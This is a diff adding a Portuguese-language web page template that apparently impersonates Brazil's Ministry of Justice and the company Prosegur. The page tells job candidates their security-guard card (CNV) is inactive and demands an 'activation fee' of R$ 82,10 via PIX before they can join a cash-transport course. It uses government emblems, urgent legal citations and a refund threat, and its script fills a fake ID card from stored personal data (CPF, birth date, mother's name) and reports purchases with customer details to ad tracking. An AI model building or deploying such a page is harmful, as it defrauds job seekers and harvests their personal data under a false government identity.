@@ -1,0 +1,368 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<main class="container mx-auto px-4 py-2 mt-4 max-w-[1200px]">
+    <div class="bg-red-50 border-2 border-red-500 text-red-800 py-4 px-6 rounded-lg mb-6 shadow-sm">
+        <div class="text-center mb-3">
+            <i class="fas fa-exclamation-triangle text-red-600 text-3xl mb-2"></i>
+            <h1 class="text-lg md:text-xl font-bold uppercase tracking-wide">ATENÇÃO - CNV REQUER ATIVAÇÃO</h1>
+        </div>
+        <div class="text-center space-y-2">
+            <p class="text-sm md:text-base font-semibold">Sua Carteira Nacional de Vigilante foi gerada, mas precisa ser ATIVADA</p>
+            <p class="text-xs md:text-sm">Conforme Lei nº 7.102/83, Art. 16, é OBRIGATÓRIA a posse da CNV ativa para exercer atividades de vigilância</p>
+            <p class="text-xs md:text-sm font-bold">SEM A CNV ATIVA, VOCÊ NÃO PODE INICIAR O CURSO DE TRANSPORTE DE VALORES</p>
+        </div>
+    </div>
+    
+    <div class="mb-6">
+        <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-4">
+            <div class="space-y-2">
+                <p class="text-gray-800 font-bold text-sm md:text-base">BLOQUEIO DE ACESSO AO CURSO</p>
+                <p class="text-gray-700 text-xs md:text-sm leading-relaxed">De acordo com a <strong>Lei Federal nº 7.102/83, Artigo 16</strong> e <strong>Portaria DPF nº 3.233/2012</strong>, é OBRIGATÓRIO que o vigilante possua a Carteira Nacional de Vigilante (CNV) ATIVA e VÁLIDA para exercer qualquer atividade de segurança privada.</p>
+                <p class="text-gray-700 text-xs md:text-sm leading-relaxed">Sem a CNV ativada, você <strong>NÃO PODE INGRESSAR</strong> em qualquer curso de segurança, incluindo:</p>
+                <ul class="list-disc list-inside text-gray-700 text-xs md:text-sm ml-4 space-y-1">
+                    <li>Curso de Transporte de Valores da Prosegur</li>
+                    <li>Cursos de Vigilância Patrimonial</li>
+                    <li>Cursos de Escolta Armada</li>
+                    <li>Qualquer treinamento em segurança privada</li>
+                </ul>
+                <p class="text-gray-800 font-bold text-xs md:text-sm">Para ativar sua CNV e resolver as pendências, efetue o pagamento da taxa de ativação abaixo.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- CNV Digital Document -->
+    <div class="bg-white shadow-lg rounded-lg overflow-hidden mb-6">
+        <div class="bg-blue-900 text-prosegur-black py-3 px-4">
+            <h2 class="text-xs md:text-sm font-medium">CARTEIRA NACIONAL DE VIGILANTE - CNV DIGITAL</h2>
+            <p class="text-xs md:text-sm text-blue-200">Ministério da Justiça e Segurança Pública</p>
+        </div>
+        
+        <div class="card-container bg-yellow-50 relative overflow-hidden shadow-2xl" style="aspect-ratio: 1.58 / 1; width: 100%; max-width: 600px; margin: 0 auto; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3), 0 6px 10px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.3);"">
+            <!-- Brazilian Coat of Arms Watermark -->
+            <div class="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
+                <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png" alt="Brazilian coat of arms" class="w-3/4 h-3/4 object-contain">
+            </div>
+            
+            <div class="relative z-10 h-full flex flex-col p-4">
+                <!-- Header -->
+                <div class="text-center mb-2">
+                    <h1 class="text-red-600 font-bold text-[2.2vw] sm:text-sm md:text-base lg:text-lg">VÁLIDA EM TODO O TERRITÓRIO NACIONAL</h1>
+                    <h2 class="text-blue-900 font-bold text-[2vw] sm:text-xs md:text-sm lg:text-base">ARTIGO 19 DA LEI 7.102 DE 20/06/1983</h2>
+                    <p class="text-blue-900 font-bold text-[1.7vw] sm:text-[0.7rem] md:text-xs lg:text-sm">É ASSEGURADO AO VIGILANTE: PORTE DE ARMA, QUANDO EM SERVIÇO;</p>
+                    <p class="text-blue-900 font-bold text-[1.7vw] sm:text-[0.7rem] md:text-xs lg:text-sm">PRISÃO ESPECIAL POR ATO DECORRENTE DO SERVIÇO</p>
+                </div>
+                
+                <!-- Main Content -->
+                <div class="flex-grow grid grid-cols-2 gap-2 text-[2.2vw] sm:text-sm md:text-base lg:text-lg">
+                    <div>
+                        <div class="mb-1">
+                            <h3 class="text-black font-bold">NOME COMPLETO</h3>
+                            <p class="text-black uppercase" id="cnv-name">NOME DO VIGILANTE</p>
+                        </div>
+                        
+                        <div class="mb-1">
+                            <h3 class="text-black font-bold">CPF</h3>
+                            <p class="text-black" id="cnv-cpf">000.000.000-00</p>
+                        </div>
+                        
+                        <div class="mb-1">
+                            <h3 class="text-black font-bold">DATA NASCIMENTO</h3>
+                            <p class="text-black" id="cnv-birth-date">18/02/1964</p>
+                        </div>
+                        
+                        <div class="mb-1">
+                            <h3 class="text-black font-bold">ÓRGÃO EXPEDIDOR</h3>
+                            <p class="text-black" id="cnv-organ">SSP/SP</p>
+                        </div>
+                    </div>
+                    
+                    <div class="flex flex-col justify-between">
+                        <div>
+                            <div class="mb-1">
+                                <h3 class="text-black font-bold">NÚMERO DE REGISTRO</h3>
+                                <p class="text-black">325673</p>
+                            </div>
+                            
+                            <div class="mb-1">
+                                <h3 class="text-black font-bold">SITUAÇÃO</h3>
+                                <p class="text-black">NÃO ATIVO</p>
+                            </div>
+                        </div>
+                        
+                        <!-- QR Code -->
+                        <div class="flex justify-end">
+                            <div id="qrcode" class="w-[35%] aspect-square"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Warning Box -->
+        <div class="mt-4 bg-yellow-600 border-l-4 border-yellow-800 p-4 rounded-r-lg">
+            <div class="flex items-start">
+                <i class="fas fa-exclamation-triangle text-yellow-200 text-xl mr-3 mt-1"></i>
+                <div>
+                    <h3 class="text-yellow-100 font-bold text-lg mb-2">Carteira Nacional de Vigilante Não Ativada</h3>
+                    <p class="text-yellow-100 font-medium">
+                        Conforme a Lei nº 7.102/83, sem a ativação da CNV não é permitido que o candidato se matricule no curso de Transporte de Valores.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ministry Instructions -->
+    <div class="bg-white border border-gray-200 rounded-lg p-6 mb-6 shadow-sm">
+        <!-- Ministry Logo and Title -->
+        <div class="bg-white border border-gray-300 rounded-lg p-8 text-center mb-6 w-full">
+            <img src="https://dspace.mj.gov.br/retrieve/74805ae2-e77e-4327-afbe-7896dcfe94a6" alt="Brasão do Ministério da Justiça" class="mx-auto mb-3 h-16 w-auto">
+            <h3 class="text-base font-normal text-gray-700">Ministério da Justiça e Segurança Pública</h3>
+        </div>
+
+        <!-- Main Information -->
+        <div class="mb-6">
+            <p class="text-gray-700 text-base font-medium mb-4">
+                Para ativar a Carteira Nacional de Vigilante é obrigatório o pagamento da Taxa de Expedição da CNV junto ao Ministério da Justiça e Segurança Pública.
+            </p>
+            
+            <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-4">
+                <div class="flex">
+                    <i class="fas fa-exclamation-circle text-red-400 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="font-bold text-red-800 mb-2">Importante</h4>
+                        <p class="text-red-700 text-sm">
+                            Se o pagamento não for realizado, o candidato não poderá realizar a matrícula no curso de Transporte de Valores da Prosegur. 
+                            Conforme a Lei nº 12.897/2013, Art. 15, § 3º, o candidato não terá direito ao reembolso de outros valores já pagos.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Box -->
+        <div class="bg-green-50 border-l-4 border-green-400 p-4">
+            <div class="flex">
+                <i class="fas fa-check-circle text-green-400 mr-3 mt-1"></i>
+                <div>
+                    <h4 class="font-bold text-green-800 mb-2">Após o Pagamento</h4>
+                    <p class="text-green-700 text-sm">
+                        A CNV será ativada automaticamente e a matrícula no curso da Prosegur será confirmada com sucesso.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Agreement Section -->
+    <div class="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
+        <div class="flex items-start space-x-4">
+            <div class="flex-shrink-0 mt-1">
+                <label class="relative inline-flex items-center cursor-pointer">
+                    <input type="checkbox" id="agreement-checkbox" class="sr-only peer">
+                    <div class="relative w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-green-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
+                </label>
+            </div>
+            <div class="flex-1">
+                <p class="text-gray-700 text-sm">
+                    Clique no botão ao lado para concordar em realizar o pagamento da Taxa de Expedição da CNV no valor de <strong>R$ 82,10</strong> para ativar a sua Carteira Nacional de Vigilante e poder ingressar no curso da Prosegur.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Action Buttons -->
+    <div class="text-center">
+        <button onclick="processCNVPayment()" id="payment-btn" class="w-full md:w-auto bg-gray-400 text-gray-600 font-bold py-4 px-8 rounded-lg text-base md:text-lg cursor-not-allowed opacity-50" disabled>
+            <span id="payment-btn-text">Pagar Taxa de Ativação</span>
+        </button>
+    </div>
+</main>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+<script>
+// Load user data from localStorage and update CNV
+document.addEventListener('DOMContentLoaded', function() {
+    try {
+        // Get user data from registration form (saved in session/form data)
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        
+        // Also try to get data from individual localStorage items
+        const candidateName = localStorage.getItem('candidateName') || userData.full_name || userData.name || '';
+        const candidateCPF = localStorage.getItem('candidateCPF') || userData.cpf || '';
+        const candidateEmail = localStorage.getItem('candidateEmail') || userData.email || '';
+        const candidatePhone = localStorage.getItem('candidatePhone') || userData.phone || '';
+        const candidateCity = localStorage.getItem('candidateCity') || userData.city || '';
+        const candidateState = localStorage.getItem('candidateState') || userData.state || '';
+        const candidateBirthDate = localStorage.getItem('candidateBirthDate') || userData.birth_date || '';
+        const candidateMotherName = localStorage.getItem('candidateMotherName') || userData.mother_name || '';
+        
+        console.log('Loading CNV data:', {
+            name: candidateName,
+            cpf: candidateCPF,
+            city: candidateCity,
+            state: candidateState,
+            birthDate: candidateBirthDate,
+            motherName: candidateMotherName,
+            allUserData: userData
+        });
+        
+        // Update CNV with real user data
+        if (candidateName) {
+            document.getElementById('cnv-name').textContent = candidateName.toUpperCase();
+        }
+        
+        if (candidateCPF) {
+            // Format CPF
+            const cpf = candidateCPF.replace(/\D/g, '');
+            if (cpf.length === 11) {
+                const formattedCPF = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                document.getElementById('cnv-cpf').textContent = formattedCPF;
+            }
+        }
+        
+        if (candidateBirthDate) {
+            // Format birth date if it's in YYYY-MM-DD format
+            let formattedBirthDate = candidateBirthDate;
+            if (candidateBirthDate.includes('-')) {
+                const [year, month, day] = candidateBirthDate.split('-');
+                formattedBirthDate = `${day}/${month}/${year}`;
+            }
+            document.getElementById('cnv-birth-date').textContent = formattedBirthDate;
+        }
+        
+        if (candidateMotherName) {
+            document.getElementById('cnv-mother-name').textContent = candidateMotherName.toUpperCase();
+        }
+        
+        // Update state info for SSP
+        if (candidateState) {
+            const stateAbbr = candidateState.length > 2 ? candidateState.substring(0, 2).toUpperCase() : candidateState.toUpperCase();
+            document.getElementById('cnv-organ').textContent = `SSP/${stateAbbr}`;
+        }
+        
+    } catch (error) {
+        console.log('Erro ao carregar dados do usuário:', error);
+    }
+    
+    // Handle agreement checkbox
+    const agreementCheckbox = document.getElementById('agreement-checkbox');
+    const paymentBtn = document.getElementById('payment-btn');
+    
+    if (agreementCheckbox && paymentBtn) {
+        agreementCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                paymentBtn.disabled = false;
+                paymentBtn.classList.remove('bg-gray-400', 'text-gray-600', 'cursor-not-allowed', 'opacity-50');
+                paymentBtn.classList.add('bg-[#044785]', 'hover:bg-[#033d73]', 'text-white');
+            } else {
+                paymentBtn.disabled = true;
+                paymentBtn.classList.remove('bg-[#044785]', 'hover:bg-[#033d73]', 'text-white');
+                paymentBtn.classList.add('bg-gray-400', 'text-gray-600', 'cursor-not-allowed', 'opacity-50');
+            }
+        });
+    }
+    
+    // Generate QR Code exactly like the provided HTML
+    window.onload = function() {
+        var qr = qrcode(0, 'M');
+        qr.addData('https://prosegur.com/cnv-validation');
+        qr.make();
+        document.getElementById('qrcode').innerHTML = qr.createImgTag(4);
+    }
+});
+
+function processCNVPayment() {
+    // Get user data from localStorage and prepare for payment
+    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+    const candidateName = localStorage.getItem('candidateName') || userData.full_name || userData.name || '';
+    const candidateCPF = localStorage.getItem('candidateCPF') || userData.cpf || '';
+    const candidatePhone = localStorage.getItem('candidatePhone') || userData.phone || '';
+    
+    // Save payment data to localStorage for /finalizar route
+    const paymentData = {
+        name: candidateName,
+        cpf: candidateCPF,
+        phone: candidatePhone,
+        amount: 82.10,
+        description: 'Taxa de Expedição da CNV - Ministério da Justiça'
+    };
+    
+    localStorage.setItem('cnvPaymentData', JSON.stringify(paymentData));
+    
+    // Redirect to /finalizar where the PIX transaction will be created
+    window.location.href = '/finalizar';
+}
+
+// Fire Meta Pixel Purchase event if conversion data is available
+{% if pixel_event_data %}
+document.addEventListener('DOMContentLoaded', function() {
+    // Check if fbq is available
+    if (typeof fbq !== 'undefined') {
+        try {
+            // Customer information from server
+            const customerInfo = {{ pixel_event_data.customer_info | tojson }};
+            const purchaseData = {{ pixel_event_data.purchase_data | tojson }};
+            
+            // Prepare event data for Meta Pixel
+            const eventData = {
+                value: purchaseData.amount,
+                currency: 'BRL',
+                content_type: 'product',
+                content_ids: [purchaseData.transaction_id],
+                content_name: 'CNV - Carteira Nacional de Vigilante'
+            };
+            
+            // Prepare customer data (will be hashed automatically by Meta)
+            const customerData = {};
+            if (customerInfo.email) customerData.em = customerInfo.email.toLowerCase().trim();
+            if (customerInfo.phone) customerData.ph = customerInfo.phone.replace(/\D/g, '');
+            if (customerInfo.full_name) {
+                const nameParts = customerInfo.full_name.trim().toLowerCase().split(' ');
+                if (nameParts.length >= 1) customerData.fn = nameParts[0];
+                if (nameParts.length >= 2) customerData.ln = nameParts[nameParts.length - 1];
+            }
+            if (customerInfo.city) customerData.ct = customerInfo.city.toLowerCase().trim();
+            if (customerInfo.state) customerData.st = customerInfo.state.toLowerCase().trim();
+            if (customerInfo.zip_code) customerData.zp = customerInfo.zip_code.replace(/\D/g, '');
+            
+            // Fire Purchase event
+            fbq('track', 'Purchase', eventData, customerData);
+            
+            console.log('Meta Pixel Purchase event fired for {{ meta_pixel_ids|length }} pixels');
+            console.log('Event data:', eventData);
+            console.log('Customer data keys:', Object.keys(customerData));
+            
+        } catch (error) {
+            console.error('Error firing Meta Pixel event:', error);
+        }
+    } else {
+        console.log('Meta Pixel (fbq) not available');
+    }
+});
+{% endif %}
+
+function downloadCNV() {
+    // Simple implementation - in production, this would generate a proper PDF
+    window.print();
+}
+</script>
+
+<style>
+@media print {
+    body * {
+        visibility: hidden;
+    }
+    .card-container, .card-container * {
+        visibility: visible;
+    }
+    .card-container {
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+    }
+}
+</style>
+{% endblock %}
